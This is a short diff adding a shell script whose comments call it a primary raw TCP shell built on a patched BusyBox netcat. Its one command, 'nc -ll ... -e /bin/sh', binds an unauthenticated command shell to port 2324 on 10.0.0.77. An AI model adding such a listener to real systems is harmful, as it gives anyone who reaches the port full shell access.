@@ -1,0 +1,5 @@
+#!/bin/sh
+# Primary raw TCP shell: no PTY, session setup or controlling terminal.
+# The recorded V2 BusyBox patch adds -s for explicit listen binding and wires
+# all three standard descriptors directly to the accepted TCP socket.
+exec /bin/nc -ll -s 10.0.0.77 -p 2324 -e /bin/sh
